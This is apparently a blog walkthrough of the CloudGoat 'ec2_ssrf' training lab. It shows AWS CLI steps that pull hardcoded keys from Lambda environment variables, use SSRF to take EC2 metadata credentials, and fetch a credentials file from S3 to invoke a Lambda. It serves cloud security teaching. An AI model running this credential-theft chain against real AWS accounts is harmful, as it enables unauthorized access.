+++
title = 'Hands on Cloud Pentesting: 11 - Cloudgoat ec2_ssrf'
date = 2025-08-27T12:34:25+05:30
draft = false
series = "Hands on Cloud Pentesting"
tags = ["cloud","aws"]
+++

<!--more-->

## ec2_ssrf (Medium)

[Scenario Page](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/README.md)
### Description
Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.

### Scenario Goal(s)
Invoke the "cg-lambda-[ CloudGoat ID ]" Lambda function.

### Solution
Start the scenario
```bash
cloudgoat create ec2_ssrf
```
![Scenario started](image.png)

We start off as the user `solus-cgid200ztfno5c`
![solus user identity](image-1.png)

For this scenario, the summary gives us a very good idea about the path we have to take to reach the scenario goal. Trying to list out the iam polices of the user/listing out the roles etc. all gives not authorized error so we can go right ahead and list out the lambda functions.

```json
// aws lambda list-functions --profile solus --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-cgid200ztfno5c",
            "FunctionArn": "arn:aws:lambda:us-east-1:1234567890:function:cg-lambda-cgid200ztfno5c",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::1234567890:role/cg-lambda-role-cgid200ztfno5c-service-role",
            "Handler": "lambda.handler",
            "CodeSize": 223,
            "Description": "Invoke this Lambda function for the win!",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-08-27T07:09:38.683+0000",
            "CodeSha256": "xt7bNZt3fzxtjSRjnuCKLV/dOnRCTVKM3D1u/BeK8zA=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "AKIASA4MJEJAEXYS4V4B",
                    "EC2_SECRET_KEY_ID": "<secret key>"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8fb60bdc-fb6c-49ff-b0e5-be303114a946",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-lambda-cgid200ztfno5c"
            }
        }
    ]
}
```

Here we can see the lambda function `cg-lambda-cgid200ztfno5c` which is the function we have to invoke to finish this scenario but the current user cannot invoke it. In the environment variables of this lambda function we can see aws creds using we can setup solus2 profile to see what it has access to.
![solus2 setup](image-2.png)

We now have a new user profile and this has access to describe the running ec2 instances using the following command.
```bash
aws ec2 describe-instances --profile solus2 --region us-east-1
```
Using this we can get the running ec2 instance and its associated ip address.

![website visit](image-4.png)
On visiting the website, it asks for URL which points at possible SSRF attack.
We can give `<ip>?url=example.com` to confirm.
![ssrf confirmed](image-5.png)
This confirms SSRF attack.

With the SSRF, we can make use of [Steal EC2 Metadata Credentials via SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) to get credentials.

![get creds with ssrf](image-3.png)

This profile has access to an S3 bucket which contains a file name `credentials`
![s3 bucket enum](image-6.png)

Copy the file and cat it to reveal the final iam credentials.
```bash
aws s3 cp s3://cg-secret-s3-bucket-cgid200ztfno5c/aws/credentials . --profile solus3
#download: s3://cg-secret-s3-bucket-cgid200ztfno5c/aws/credentials to ./credentials

cat credentials
# [default]
# aws_access_key_id = AKIASA4MJEJAL5KMRVWY
# aws_secret_access_key = <secret access key>
# region = us-east-1
```

Using these creds we can invoke the aws lambda function and finish the scenario.
```bash
aws lambda invoke --function-name cg-lambda-cgid200ztfno5c ./out.txt --profile solus4 --region us-east-1
# {
#     "StatusCode": 200,
#     "ExecutedVersion": "$LATEST"
# }
cat out.txt
# "You win!"
```

Stop the scenario
```bash
cloudgoat destroy ec2_ssrf
```